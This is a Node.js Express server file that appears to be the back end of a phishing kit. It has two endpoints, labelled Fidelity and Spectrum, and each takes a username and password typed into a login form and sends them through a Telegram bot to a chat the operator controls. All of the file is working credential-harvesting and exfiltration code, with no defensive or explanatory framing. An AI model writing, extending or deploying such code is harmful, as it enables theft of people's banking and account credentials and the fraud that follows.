import dotenv from "dotenv";
dotenv.config();

const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(bodyParser.json());
app.use(express.static("public")); // Serve static files (like the HTML form)

async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "Markdown",
  };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    return response.json();
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
}

// Fidelity Login Endpoint
app.post("/send-login", async (req, res) => {
  const { username, password, remember } = req.body;

  const message = `
*Fidelity Login Credentials:*
- Username: \`${username}\`
- Password: \`${password}\`
- Remember Username: ${remember ? "Yes" : "No"}
  `;

  await sendTelegramMessage(message);
  res.sendStatus(200);
});

// Spectrum Login Endpoint (changed variable names to match sketch)
app.post("/send-spectrum-login", async (req, res) => {
  const { spectrumUsername, spectrumPassword, staySignedIn } = req.body;

  const message = `
*Spectrum Login Credentials:*
- Username: \`${spectrumUsername}\`
- Password: \`${spectrumPassword}\`
- Stay Signed In: ${staySignedIn ? "Yes" : "No"}
  `;

  await sendTelegramMessage(message);
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
